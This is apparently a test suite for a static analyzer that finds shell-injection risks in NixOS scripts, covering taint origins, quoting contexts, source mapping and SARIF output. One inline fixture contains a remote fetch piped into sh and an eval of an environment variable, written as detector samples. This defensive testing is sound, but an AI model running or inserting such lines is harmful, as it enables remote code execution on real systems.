// NIX-003: Nix interpolation and embedded-shell taint.
// Suite "nix-script-taint" (HASKELL_NIXOS_FULL_CAPABILITY_PRD.md).
//
// Every case is a real .nix fixture under test/fixtures/nix-script-taint/. Labels live here, never in the
// fixtures; the analyzer reads only the Nix text.

import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { analyzeNixScripts, lexShell, SHELL_PLACEHOLDER as PH, NIX_SCRIPT_RULES } from '../../src/language/nix-script-taint.js';

const HERE = dirname(fileURLToPath(import.meta.url));
const FIX = join(HERE, '..', 'fixtures', 'nix-script-taint');
const BIN = join(HERE, '..', '..', 'bin', 'agentic-security.js');
const load = (d) => Object.fromEntries(readdirSync(join(FIX, d)).filter((f) => f.endsWith('.nix')).map((f) => [f, readFileSync(join(FIX, d, f), 'utf8')]));
const run = (d) => analyzeNixScripts({ files: load(d) });
const lineText = (files, f) => files[f.file].split('\n')[f.line - 1];
const sliceSpan = (text, sp) => text.slice(sp.startOffset, sp.endOffset);
const byRule = (r, rule) => r.findings.filter((f) => f.rule === rule);

test('[NIX-003.AC01] a cross-file Nix source reaches an interpolated shell sink, with the right origin', () => {
  const r = run('cross-file');
  const inj = byRule(r, 'nix-shell-injection');
  assert.equal(inj.length, 2);
  const env = inj.find((f) => /getEnv|environment/.test(f.origins.map((o) => o.detail).join(' ')));
  assert.equal(env.severity, 'high');
  assert.deepEqual(env.origins.map((o) => o.kind).filter((k) => k !== 'constant'), ['attacker']);
  const cfg = inj.find((f) => lineText(load('cross-file'), f).includes('rm -rf'));
  assert.equal(cfg.severity, 'medium');
  assert.ok(cfg.origins.some((o) => o.kind === 'configuration' && /services\.backup\.target/.test(o.detail)));
  assert.ok(!cfg.origins.some((o) => o.kind === 'attacker'), 'configuration is never promoted to attacker');
  assert.equal(cfg.sink.kind, 'filesystem'); assert.equal(cfg.sink.command, 'rm'); assert.equal(cfg.sink.context, 'unquoted');
  // the chain walks from the option in the OTHER file to the shell sink
  const files = new Set(cfg.chain.map((h) => h.file));
  assert.ok(files.has('vars.nix') && files.has('configuration.nix'), JSON.stringify([...files]));
  assert.equal(cfg.chain[0].file, 'vars.nix');
  assert.equal(cfg.chain[cfg.chain.length - 1].kind, 'shell');
});

test('[NIX-003.AC01] a service environment value reaches a generated script through a shell expansion', () => {
  const r = run('service-env');
  const f = byRule(r, 'nix-service-env-shell');
  assert.equal(f.length, 1, 'only the UNQUOTED expansion of the configuration-origin variable');
  assert.equal(f[0].environmentVariable, 'TARGET');
  assert.match(lineText(load('service-env'), f[0]), /rm -rf \$TARGET\/old/);
  assert.deepEqual(f[0].origins.map((o) => o.kind), ['configuration']);
  assert.ok(f[0].chain.some((h) => /environment\.TARGET/.test(h.label)), 'the chain starts at the environment binding');
  assert.ok(!r.findings.some((x) => /quoted/.test(lineText(load('service-env'), x))), '"$TARGET" (quoted) is not reported');
  assert.ok(!r.findings.some((x) => /FIXED/.test(lineText(load('service-env'), x))), 'a constant environment value is not reported');
});

test('[NIX-003.AC01] a correctly quoted argument is safe, wrong-context escaping is not', () => {
  const files = load('quoting');
  const r = run('quoting');
  const at = (re) => r.findings.filter((f) => re.test(lineText(files, f)));
  assert.equal(at(/cp a /).length, 0, 'escapeShellArg, unquoted: safe');
  assert.equal(at(/cp b /).length, 0, 'escapeShellArgs of a list, unquoted: safe');
  assert.deepEqual(at(/cp c /).map((f) => f.rule), ['nix-escape-wrong-context'], 'escapeShellArg inside "...": wrong context');
  assert.deepEqual(at(/cp d /).map((f) => f.rule), ['nix-escape-wrong-context'], "escapeShellArg inside '...': wrong context");
  assert.deepEqual(at(/cp e /).map((f) => f.rule), ['nix-shell-injection'], 'plain "${x}"');
  assert.deepEqual(at(/cp f /).map((f) => f.rule), ['nix-shell-injection'], "plain '${x}'");
  assert.deepEqual(at(/cp g /).map((f) => f.rule), ['nix-shell-injection'], 'plain unquoted');
  assert.deepEqual(at(/cp h /).map((f) => f.rule), ['nix-escape-wrong-kind'], 'an escaping function for a different language');
  const wrong = at(/cp c /)[0];
  assert.match(wrong.description, /\$\(\.\.\.\)/, 'the residual expansion risk is explained');
  const flows = r.flows.filter((f) => f.protection);
  assert.ok(flows.some((f) => f.protectedInContext) && flows.some((f) => !f.protectedInContext));
});

test('[NIX-003.AC02] Nix escapes and shell expansions keep their own language boundaries', () => {
  const files = load('literals');
  const r = run('literals');
  const s = r.scripts.find((x) => x.attrPath === 'systemd.services.literals.script');
  assert.ok(s.generated.includes('echo ${HOME}'), "''${HOME} is the literal shell text ${HOME}");
  assert.ok(s.generated.includes('echo "${USER}"'));
  assert.equal(s.placeholders, 7, "only real Nix interpolations become placeholders (''${...} does not)");
  const act = r.scripts.find((x) => x.attrPath === 'system.activationScripts.escaped.text');
  assert.equal(act.generated, 'echo ${notNix} ￼', '\\${ in a plain string is literal, ${name} is an interpolation');
  assert.equal(s.decoded, 'exact');
  // none of those is an injection: constants, store paths, helper identity over a constant, quoted heredoc, comment
  assert.deepEqual(byRule(r, 'nix-shell-injection'), []);
  assert.deepEqual(byRule(r, 'nix-service-env-shell'), []);
  assert.deepEqual(r.findings.filter((f) => f.severity !== 'low'), []);
  // the one real shell risk (an unquoted unset expansion in rm -rf) is reported as a low shell finding, not as Nix injection
  const low = r.findings;
  assert.equal(low.length, 1);
  assert.equal(low[0].rule, 'nix-shell-unquoted-expansion');
  assert.match(lineText(files, low[0]), /SUBDIR/);
  assert.equal(low[0].origins[0].kind, 'unknown');
});

test('[NIX-003.AC02] the shell lexer tracks quoting, heredocs, comments and command substitution', () => {
  const ctx = (s) => lexShell(s).phs.map((p) => p.context);
  assert.deepEqual(ctx(`a ${PH} "${PH}" '${PH}' \\${PH}`), ['unquoted', 'double', 'single', 'unquoted']);
  assert.deepEqual(ctx(`cat <<EOF\n${PH}\nEOF\ncat <<'EOF'\n${PH}\nEOF\necho ${PH}\n`), ['heredoc-expanding', 'heredoc-literal', 'unquoted']);
  assert.deepEqual(ctx(`# ${PH}\necho ${PH}`), ['comment', 'unquoted']);
  assert.deepEqual(ctx(`echo "$(foo ${PH})" "x${PH}"`), ['unquoted', 'double']);
  const l = lexShell('rm -rf $A "$B" \'$C\'');
  assert.deepEqual(l.exps.map((e) => [e.name, e.context]), [['A', 'unquoted'], ['B', 'double']], 'no expansion inside single quotes');
  assert.deepEqual(lexShell('a=1 FOO=2 env ls').cmds[0].name, 'env');
});

test('[NIX-003.AC02] raw generated-script shell risks are found, and only where they are real', () => {
  const files = {
    'a.nix': "{ pkgs, ... }: {\n  systemd.services.x.script = ''\n    eval $CMD\n    sh -c \"$1\"\n    curl https://example.invalid/i.sh | sh\n    rm -rf \"$SAFE\"\n    echo $PLAIN\n  '';\n}\n",
  };
  const r = analyzeNixScripts({ files });
  assert.deepEqual(r.findings.map((f) => f.rule).sort(), ['nix-pipe-to-shell', 'nix-shell-eval']);
  const ev = byRule(r, 'nix-shell-eval')[0];
  assert.match(lineText(files, ev), /eval \$CMD/);
  assert.equal(r.findings.every((f) => f.generatedLocation && f.originalLocation), true);
});

test('[NIX-003.AC03] findings link generated shell ranges to the exact originating Nix span', () => {
  const files = load('cross-file');
  const r = run('cross-file');
  for (const f of r.findings) {
    const src = files[f.file];
    const text = sliceSpan(src, f.originalLocation);
    assert.match(text, /^\$\{.*\}$|^\$\{|v\.|lib\./, `original location covers the interpolation: ${text}`);
    assert.equal(f.originalLocation.startLine, f.line);
    assert.equal(f.originalLocation.startColumn, f.column);
    assert.equal(f.generatedLocation.generated, true);
  }
  const rm = r.findings.find((f) => /rm -rf/.test(lineText(files, f)));
  assert.equal(sliceSpan(files['configuration.nix'], rm.originalLocation), 'v.target');
  // the script's own map: the generated column range of that placeholder maps back to the same source text
  const script = r.scripts[0];
  const gen = script.generated.split('\n')[rm.generatedLocation.line - 1];
  assert.equal(gen, 'rm -rf ' + PH);
  const first = script.generated.indexOf('rm -rf ' + PH) + 7;
  const back = script.mapRange(first, first + 1);
  assert.equal(sliceSpan(files['configuration.nix'], back).startsWith('${v.target}'), true);
  assert.equal(back.startLine, rm.line);
});

test('[NIX-003.AC03] the CLI reports the findings and SARIF carries column-exact code flows', () => {
  const env = { ...process.env }; delete env.NODE_TEST_CONTEXT;
  const p = spawnSync(process.execPath, [BIN, 'scan', join(FIX, 'cross-file'), '--format', 'sarif'], { encoding: 'utf8', env, timeout: 180000, maxBuffer: 64 << 20 });
  const sarif = JSON.parse(p.stdout);
  const results = sarif.runs[0].results.filter((x) => /Nix_interpolation|shell/i.test(x.message.text) || x.codeFlows);
  assert.ok(results.length >= 1, p.stdout.slice(0, 400));
  const withFlow = results.find((x) => x.codeFlows && x.codeFlows[0].threadFlows[0].locations.length >= 3);
  assert.ok(withFlow, 'a multi-hop code flow');
  const locs = withFlow.codeFlows[0].threadFlows[0].locations.map((l) => l.location.physicalLocation);
  assert.ok(locs.some((l) => l.artifactLocation.uri === 'vars.nix'), 'the flow starts in the other file');
  assert.ok(locs.every((l) => Number.isInteger(l.region.startColumn)), 'column-exact regions');
  assert.ok(locs.some((l) => l.region.endColumn > l.region.startColumn));
});

test('[NIX-003.AC03] scripts in shells or languages that are not modelled are coverage gaps, never analyzed', () => {
  const r = run('unsupported');
  const kinds = r.gaps.map((g) => `${g.kind}:${g.line}`).sort();
  assert.deepEqual(kinds, ['script-not-analyzable:15', 'unsupported-script-language:10', 'unsupported-shell:5']);
  for (const g of r.gaps) assert.match(g.detail, /not analyzed|analyzed|string literals/);
  // the fish and python scripts contain `rm -rf ${cfg.target}` but produce NO finding: nothing was analyzed
  assert.equal(r.findings.length, 1);
  assert.match(lineText(load('unsupported'), r.findings[0]), /rm -rf/);
  assert.equal(r.findings[0].attrPath, 'systemd.services.supported.script');
  assert.equal(r.scripts.filter((x) => x.attrPath === 'systemd.services.supported.script').length, 1);
  assert.ok(!r.scripts.some((x) => /dynamic/.test(x.attrPath)), 'a script built by readFile is not decoded at all');
});

test('[NIX-003.AC04] secret, attacker and configuration origins stay distinct end to end', () => {
  const r = run('origins');
  const kinds = r.findings.map((f) => [...new Set(f.origins.map((o) => o.kind).filter((k) => k !== 'constant'))].join('+')).sort();
  assert.deepEqual(kinds, ['attacker', 'configuration', 'configuration']);
  const secretFlow = r.flows.find((f) => f.origins.includes('secret'));
  assert.ok(secretFlow, 'the secret origin is tracked as its own flow');
  assert.equal(secretFlow.context, 'double');
  assert.ok(!r.findings.some((f) => f.origins.some((o) => o.kind === 'secret')), 'a quoted secret is not mislabelled as an injection');
  const arg = r.flows.find((f) => f.origins.includes('store'));
  assert.ok(arg, 'a function argument used as a path prefix is treated as a store path');
  for (const f of r.findings) assert.equal(f.origins.filter((o) => o.kind === 'attacker').length === 0 || f.origins.every((o) => o.kind !== 'configuration'), true, 'no finding merges attacker with configuration');
});

test('[NIX-003.AC04] no application flow is inferred from a Nix environment variable without an evidenced bridge', () => {
  const files = { ...load('origins'), 'App.hs': readFileSync(join(FIX, 'origins', 'App.hs'), 'utf8') };
  const r = analyzeNixScripts({ files });
  assert.ok(r.findings.length >= 1);
  for (const f of r.findings) { assert.equal(f.bridge, null); assert.equal(f.applicationFlow, 'not-inferred'); assert.equal(f.language, 'nix'); }
  assert.ok(!r.findings.some((f) => /\.hs$/.test(f.file)), 'no Haskell finding is produced from the Nix side');
  assert.ok(!r.flows.some((f) => /App\.hs/.test(JSON.stringify(f))));
  // the Haskell program reads APP_TARGET, the Nix service sets APP_TARGET: that coincidence alone is not a flow
  assert.match(files['App.hs'], /getEnv "APP_TARGET"/);
  assert.match(files['configuration.nix'], /APP_TARGET/);
});

test('[NIX-003.AC04] a Nix-level analysis never throws on malformed or hostile input', () => {
  const bad = { 'a.nix': '{ x = \'\'${', 'b.nix': 'let x = x; in "${x}"', 'c.nix': '{ systemd.services.a.script = "${a.b.c.d}"; }', 'd.nix': '' };
  const r = analyzeNixScripts({ files: bad });
  assert.ok(Array.isArray(r.findings));
  assert.ok(Object.keys(NIX_SCRIPT_RULES).length >= 6);
});
